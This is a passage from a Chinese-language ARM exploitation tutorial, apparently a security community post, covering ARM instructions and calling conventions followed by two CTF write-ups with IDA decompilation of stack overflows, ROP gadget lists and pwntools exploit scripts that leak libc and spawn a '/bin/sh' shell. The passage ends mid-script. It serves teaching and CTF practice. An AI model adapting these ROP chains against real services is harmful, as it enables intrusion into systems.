<td>加载</td>
</tr>
<tr>
<td>ADD</td>
<td>加法</td>
<td>STR</td>
<td>存储</td>
</tr>
<tr>
<td>SUB</td>
<td>减法</td>
<td>LDM</td>
<td>加载多个</td>
</tr>
<tr>
<td>MUL</td>
<td>乘法</td>
<td>STM</td>
<td>存储多个</td>
</tr>
<tr>
<td>LSL</td>
<td>逻辑左移</td>
<td>PUSH</td>
<td>入栈</td>
</tr>
<tr>
<td>LSR</td>
<td>逻辑右移</td>
<td>POP</td>
<td>出栈</td>
</tr>
<tr>
<td>ASR</td>
<td>算术右移</td>
<td>B</td>
<td>跳转</td>
</tr>
<tr>
<td>ROR</td>
<td>右旋</td>
<td>BL</td>
<td>Link+跳转</td>
</tr>
<tr>
<td>CMP</td>
<td>比较</td>
<td>BX</td>
<td>分支跳转</td>
</tr>
<tr>
<td>AND</td>
<td>按位与</td>
<td>BLX</td>
<td>Linx+分支跳转</td>
</tr>
<tr>
<td>ORR</td>
<td>按位或</td>
<td>SWI/SVC</td>
<td>系统调用</td>
</tr>
</tbody>
</table>
<p>这里需要单独介绍一下LDR和STR两个指令</p>
<p>LDR用于将某些内容从内存加载到寄存器中，例如LDR R2, [R0]从R0寄存器中存储的内存地址的值读入R2寄存器</p>
<p>STR用于将某些内容从寄存器存储到内存地址中，例如STR R2, [R1]从R2寄存器中将值存储到R1寄存器中的内存地址中</p>
<p>这里顺便补充一下B,BL.BLX.BX的区别：</p>
<pre><code>(1) B 跳转指令

(2) BL 带返回的跳转指令

(3) BLX 带返回和状态切换的跳转指令

(4) BX 带状态切换的跳转指令</code></pre>
<h3 data-content="1" id="e5e14507f7382e4cf89b4dc73c349bc2">寄存器传参方式</h3>
<p>32位arm-&gt;寄存器传参，r0第一个参数，r1第二个参数,r2第三个参数，r3第四个参数，超过4个参数还是堆栈传参</p>
<h3 data-content="1" id="4fa4c55679597c69211687c18e2207a7">调试脚本</h3>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="c1"># 执行 attach.sh 端口号</span>
<span class="nv">arch</span><span class="o">=</span><span class="s2">"arm"</span>
<span class="nv">pid</span><span class="o">=</span><span class="sb">`</span>ps -a<span class="p">|</span>grep <span class="s2">"qemu"</span><span class="p">|</span>awk <span class="s1">'{print $1}'</span><span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"pid is :"</span> <span class="si">${</span><span class="nv">pid</span><span class="si">}</span>
<span class="nv">addr</span><span class="o">=</span><span class="sb">`</span>cat /proc/<span class="si">${</span><span class="nv">pid</span><span class="si">}</span>/maps <span class="p">|</span>grep libc-<span class="p">|</span>awk -F <span class="se">\-</span> <span class="s1">'{if(NR==1) print "0x" $1}'</span><span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"libc addr is :"</span><span class="si">${</span><span class="nv">addr</span><span class="si">}</span>
<span class="nv">libc_file_path</span><span class="o">=</span><span class="sb">`</span>cat /proc/<span class="si">${</span><span class="nv">pid</span><span class="si">}</span>/maps <span class="p">|</span>grep libc-<span class="p">|</span>awk  <span class="s1">'{if(NR==1) print $6}'</span><span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"libc file path is:"</span><span class="si">${</span><span class="nv">libc_file_path</span><span class="si">}</span>
gdb-multiarch <span class="se">\</span>
    -ex <span class="s2">"file ./pwn"</span> <span class="se">\</span>
    -ex <span class="s2">"target remote :</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">"</span> <span class="se">\</span>
    -ex <span class="s2">"set architecture </span><span class="si">${</span><span class="nv">arch</span><span class="si">}</span><span class="s2">"</span> <span class="se">\</span>
    -ex <span class="s2">"add-symbol-file </span><span class="si">${</span><span class="nv">libc_file_path</span><span class="si">}</span><span class="s2"> </span><span class="si">${</span><span class="nv">addr</span><span class="si">}</span><span class="s2">"</span>
</pre></div>
<p>用法</p>
<pre><code>bash attach.sh port</code></pre>
<h3 data-content="1" id="9b97475673125edcf3dce3f48a346d2e">实操</h3>
<h4 data-content="1" id="389bb6f965e6876e140dc73a1167b57c">ret2libc</h4>
<p><strong>checksec,file</strong></p>
<pre><code>Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)</code></pre>
<pre><code>wn: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, BuildID[sha1]=ff3eaeb05a02cfaf5081fa09b0ad4c61680b8fdd, for GNU/Linux 3.2.0, not stripped</code></pre>
<p>32位arm，开启nx保护，那么远程是存在aslr保护的</p>
<p>动态链接的文件</p>
<p><strong>IDA静态分析</strong></p>
<p><strong>main()</strong></p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">func</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>调用dofunc()函数</p>
<p><strong>func()</strong></p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">func</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [sp+0h] [bp-Ch] BYREF</span>

  <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"input:"</span><span class="p">,</span> <span class="mi">6u</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256u</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"byebye"</span><span class="p">,</span> <span class="mi">6u</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>简单的栈溢出，这里buf开辟了3字节的缓冲区，但是read()读取的时候写入256字节的内容</p>
<p>这里顺便说一下为什么栈溢出这么多字节，是因为我们在arm架构中的gadget中是没有x86架构那种的pop,ret的，所以需要用类似x86架构下的ret2csu打法多次调用寄存器</p>
<p>我理解的泄露ret2csu的思路</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200307-e31725c6-2950-1.png"/></p>
<p>通过不断调用这一段gadget，从而调用真正的write,read，从而写入我们的system，以及binsh字符串，从而getshell</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200313-e6ae6a00-2950-1.png"/></p>
<p>exp:</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"qemu-arm"</span><span class="p">,</span><span class="s2">"-g"</span><span class="p">,</span> <span class="s2">"1234"</span><span class="p">,</span><span class="s2">"-L"</span><span class="p">,</span> <span class="s2">"/usr/arm-linux-gnueabi/"</span><span class="p">,</span> <span class="s2">"./pwn"</span><span class="p">])</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">'qemu-arm'</span><span class="p">,</span><span class="s1">'-L'</span><span class="p">,</span><span class="s1">'/usr/arm-linux-gnueabi/'</span><span class="p">,</span><span class="s1">'./pwn'</span><span class="p">])</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">'arm'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="sd">"""</span>
<span class="sd">0x000104e0 : mov r2, sb ; mov r1, r8 ; mov r0, r7 ; ldr r3, [r5], #4 ; add r4, r4, #1 ; blx r3</span>
<span class="sd">0x000104e0 : mov r2, sb ; mov r1, r8 ; mov r0, r7 ; ldr r3, [r5], #4 ; add r4, r4, #1 ; blx r3 ; cmp r6, r4 ; bne #0x104e0 ; pop {r4, r5, r6, r7, r8, sb, sl, pc}</span>
<span class="sd">0x000104a0 : mov r3, #0 ; mov r0, r3 ; pop {fp, pc}</span>
<span class="sd">0x0001047c : mov r3, #0 ; mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}</span>
<span class="sd">0x00010418 : mov r3, #1 ; strb r3, [r4] ; pop {r4, pc}</span>
<span class="sd">0x000104dc : mov r4, #0 ; mov r2, sb ; mov r1, r8 ; mov r0, r7 ; ldr r3, [r5], #4 ; add r4, r4, #1 ; blx r3</span>
<span class="sd">0x000104dc : mov r4, #0 ; mov r2, sb ; mov r1, r8 ; mov r0, r7 ; ldr r3, [r5], #4 ; add r4, r4, #1 ; blx r3 ; cmp r6, r4 ; bne </span>
<span class="sd">0x104e0 ; pop {r4, r5, r6, r7, r8, sb, sl, pc}</span>
<span class="sd">0x00010488 : pop {fp, pc}</span>
<span class="sd">0x00010488 : pop {fp, pc} ; andeq r0, r1, ip, lsl r5 ; andeq r0, r1, r4, lsr #10 ; push {fp, lr} ; add fp, sp, #4 ; bl #0x1042c ; mov r3, #0 ; mov r0, r3 ; pop {fp, pc}</span>
<span class="sd">0x000102e8 : pop {r3, pc}</span>
<span class="sd">0x00010420 : pop {r4, pc}</span>
<span class="sd">0x00010500 : pop {r4, r5, r6, r7, r8, sb, sl, pc}</span>
<span class="sd">"""</span>

<span class="n">r4_r10_pc</span><span class="o">=</span><span class="mh">0x00010500</span>
<span class="n">write</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
<span class="n">read</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
<span class="n">bss</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span>
<span class="n">bss_8</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x108</span>
<span class="n">ret_addr</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'dofunc'</span><span class="p">]</span>

<span class="c1">#pop {r4, r5, r6, r7, r8, sb, sl, pc}</span>
<span class="n">again</span><span class="o">=</span><span class="mh">0x000104e0</span>
<span class="c1">#mov r2, sb ; mov r1, r8 ; mov r0, r7 ; ldr r3, [r5], #4 ; add r4, r4, #1 ; blx r3 ; cmp r6, r4 ; bne #0x104e0 ; pop {r4, r5, r6, r7, r8, sb, sl, pc}</span>
<span class="n">pc</span><span class="o">=</span><span class="mh">0x00010500</span>

<span class="n">ru</span><span class="p">(</span><span class="s2">"input:"</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">12</span><span class="p">,</span><span class="n">r4_r10_pc</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">write</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">read</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="n">pc</span><span class="p">])</span>

<span class="n">payload</span><span class="o">+=</span><span class="n">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="n">read</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">bss</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="n">again</span><span class="p">])</span>

<span class="n">payload</span><span class="o">+=</span><span class="n">flat</span><span class="p">([</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="n">ret_addr</span><span class="p">])</span>

<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'byebye'</span><span class="p">)</span>

<span class="n">read_real</span><span class="o">=</span><span class="n">uu32</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">libcbase</span><span class="o">=</span><span class="n">read_real</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>

<span class="n">system</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>

<span class="n">sl</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s2">"input:"</span><span class="p">)</span>

<span class="n">payload</span><span class="o">+=</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">r4_r10_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bss_8</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">again</span><span class="p">)</span>

<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h4 data-content="1" id="8091e5b1d27c03a624cff8f3a28b40cf">2022安询杯babyarm</h4>
<p>file&amp;checksec</p>
<pre><code>Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)</code></pre>
<pre><code>chall: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=829f6a8ec1a5969fb01d69b6fdc4053923e8736a, stripped</code></pre>
<p>IDA看一下</p>
<p><strong>main_0()</strong></p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">sub_105FC</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"===== Simple Decoder ====="</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"===== v1.0.0 ====="</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">sub_10B60</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p><strong>sub_105FC()</strong></p>
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">sub_105FC</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">alarm</span><span class="p">(</span><span class="mh">0x1Eu</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>就是关闭缓冲区，设定计时器</p>
<p><strong>sub_10b60(真正的main)</strong></p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">sub_10B60</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// r0</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// r0</span>
  <span class="kt">char</span> <span class="n">v2</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [sp+0h] [bp-2Ch] BYREF</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-8h]</span>

  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"msg&gt; "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x80u</span><span class="p">);</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200u</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">sub_10668</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"res&gt; "</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="s">"Sp5jS6mpH6LZC6GqSWe="</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"comment&gt; "</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="mi">256u</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>逆向分析一下，malloc申请0x80的空间存储输入的msg的值，s同理</p>
<p>这里利用strcmp()进行比较，如果res与Sp5jS6mpH6LZC6GqSWe=相等，那么就会提示我们输入内容，利用read()进行读取我们输入的内容</p>
<p>其实就是利用ret2csu的打法泄露libc基地址，将system，binsh利用read写入之后再调用从而getshell</p>
<p>exp:</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"qemu-arm"</span><span class="p">,</span><span class="s2">"-g"</span><span class="p">,</span> <span class="s2">"1212"</span><span class="p">,</span><span class="s2">"-L"</span><span class="p">,</span> <span class="s2">"/usr/arm-linux-gnueabi/"</span><span class="p">,</span> <span class="s2">"./chall"</span><span class="p">])</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">'qemu-arm'</span><span class="p">,</span><span class="s1">'-L'</span><span class="p">,</span><span class="s1">'/usr/arm-linux-gnueabi/'</span><span class="p">,</span><span class="s1">'./chall'</span><span class="p">])</span>
<span class="c1">#p = remote('47.108.29.107',10244)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">'arm'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./chall'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.27.so'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['gnome-terminal','-x','sh','-c']</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
